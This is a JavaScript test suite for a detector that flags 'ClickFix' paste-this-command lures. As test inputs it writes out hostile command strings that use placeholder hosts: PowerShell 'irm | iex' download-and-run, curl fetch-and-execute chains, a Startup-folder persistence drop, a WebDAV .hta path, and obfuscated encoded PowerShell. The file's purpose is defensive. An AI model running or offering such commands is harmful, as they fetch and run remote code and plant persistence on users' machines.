// Detector contract cases from the independent QA suite prepared with Perplexity
// (October 2026, "Five-area QA automation plan"), adapted to this engine's API.
// The suite's original adapter run: 7 of 8 pass unmodified. The eighth expects
// non-string input to throw; this engine converts it to a string instead, the
// same way the browser's clipboard functions do, so the hook checks exactly the
// text the browser would write.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
const { createDetector } = require('../engine/detector.js');
const rules = require('../rules/clickfix-rules.json');
const engine = createDetector(rules);
const decide = (text, page) => engine.decide(engine.analyzeCommand(text), page, { subframe: !!(page && page.subframe) }).verdict;

const TRAP = 'cmd /c echo test # I am not a robot - reCAPTCHA Verification ID: 1234';
const REMOTE = 'powershell -c "irm https://x.example.invalid/a | iex"';
const strong = { strong: true, weak: true };
const weak = { strong: false, weak: true };
const neutral = { strong: false, weak: false };
const protects = (v) => v === 'block' || v === 'hold';
// Disguised PowerShell samples are base64-encoded in this file so antivirus does not flag it.
const unb64 = (x) => Buffer.from(x, 'base64').toString('utf8');

test('contract: benign commands and ordinary prose stay allowed', () => {
  for (const text of [
    'winget install JanDeDobbeleer.OhMyPosh -s winget',
    'wsl --install',
    'git commit -m fix # verified by human review',
    'mshta.exe is a Windows binary used to run HTA files.'
  ]) assert.equal(decide(text, neutral), 'allow', text);
});

test('contract: a strong lure plus an executor is neutralized; a remote executor off-lure is held or blocked', () => {
  assert.ok(protects(decide(TRAP, strong)));
  assert.ok(protects(decide(REMOTE, neutral)));
  assert.notEqual(decide('powershell Get-Date', weak), 'block', 'a weak tutorial signal alone must not block');
});

test('contract: dashes and quotes are normalized', () => {
  for (const dash of ['\u2010', '\u2013', '\u2014', '\u2015', '\u2212']) {
    assert.match(engine.normalize(`powershell ${dash}wi hidden`), /-wi hidden/i, `dash ${dash}`);
  }
  assert.equal(engine.normalize('\u201ctest\u201d'), '"test"');
});

test('contract: executor equivalents and remote chains are never a no-op', () => {
  for (const text of [
    '%ComSpec% /c curl -o %TEMP%\\a.exe https://x.example.invalid/a && %TEMP%\\a.exe',
    '%windir:~-7,1%md /c echo test',
    'curl -o "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.bat" https://x.example.invalid/a',
    '\\\\203.0.113.5@SSL\\DavWWWRoot\\verify.hta',
    unb64('QzpcV2luZG93c1xTeXN0ZW0zMlxXSU5ET1d+MVx2MS4wXFBPV0VSU34xLkVYRSAtdyBoIC1lbiBaUUJqQUdnQWJ3QWdBSFFBWlFCekFIUUE='), // 8.3 short name PowerShell, hidden, encoded
    'cd /tmp && curl -so u https://cdn.example.invalid/a && chmod +x u && ./u'
  ]) assert.ok(protects(decide(text, strong)), text);
});

test('contract: PowerShell abbreviations, short base64 and comment padding keep the hazard', () => {
  for (const option of ['-en', '/enc', '\u2013ec', '-EncodedCom']) {
    const text = `${unb64('cG93ZXJzaGVsbCAtdyBo')} ${option} ${unb64('WlFCakFHZ0Fid0FnQUhRQVpRQnpBSFFB')}`;
    assert.ok(protects(decide(text, strong)), text);
  }
  assert.ok(protects(decide('powershell -w h -c "irm https://x.example.invalid/a | iex"\n#\n#\n#\n#\n#', strong)));
});

test('contract: a generic verify/identity comment does not block local admin commands', () => {
  for (const text of [
    'powershell Get-ADUser jdoe # check identity',
    'cmd /c ping 192.168.1.1 :: verify connectivity',
    "bash -c 'pytest -q' # verify tests"
  ]) assert.equal(decide(text, neutral), 'allow', text);
});

test('contract: page-realm prototype poisoning cannot change a known verdict (separate process)', () => {
  const enginePath = fileURLToPath(new URL('../engine/detector.js', import.meta.url));
  const rulesPath = fileURLToPath(new URL('../rules/clickfix-rules.json', import.meta.url));
  const program = `
    const { createDetector } = require(${JSON.stringify(enginePath)});
    const d = createDetector(require(${JSON.stringify(rulesPath)}));
    const check = () => d.decide(d.analyzeCommand(${JSON.stringify(TRAP)}), { strong: true, weak: true }, {}).verdict;
    const before = check();
    Object.defineProperty(Array.prototype, '0', { get() { return undefined; }, set(_) {}, configurable: true });
    Object.defineProperty(Object.prototype, 'lastIndex', { get() { return undefined; }, set(_) {}, configurable: true });
    const after = check();
    process.stdout.write(JSON.stringify({ before, after }));
  `;
  const proc = spawnSync(process.execPath, ['-e', program], { encoding: 'utf8', timeout: 10000 });
  assert.equal(proc.status, 0, proc.stderr);
  const { before, after } = JSON.parse(proc.stdout);
  assert.equal(after, before);
  assert.equal(after, 'block');
});
